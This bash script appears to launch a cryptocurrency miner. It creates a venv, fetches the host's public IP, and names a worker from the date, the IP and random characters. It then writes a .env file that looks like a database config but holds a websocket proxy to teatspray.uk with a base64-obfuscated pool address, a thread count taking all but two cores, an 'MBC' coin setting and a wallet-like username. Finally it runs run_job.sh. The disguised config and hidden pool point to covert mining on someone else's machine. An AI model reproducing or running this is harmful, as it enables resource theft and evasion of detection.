#!/bin/bash
export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive
export TERM=xterm
sleep 2

python3 -m venv .venv
sleep 2
source .venv/bin/activate
sleep 2

array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y-RendWasm_')
ipaddress=$(wget -q -O - api.ipify.org)
num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
used_num_of_cores=`expr $num_of_cores - 2`
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

echo ""
echo "You will be using $used_num_of_cores cores"
echo ""


cat >.env <<-EOL
host=127.0.0.1
port=3306
proxy=ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/Zmx5aW5nc2F1Y2VyLWV1LnRlYXRzcHJheS51azo2MjQy
threads=$used_num_of_cores
password=$currentdate,c=MBC,zap=MBC
username=MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93
EOL

sleep 2

echo ""
echo "Your worker name will be $currentdate"
echo ""
sleep 2

bash run_job.sh cycle
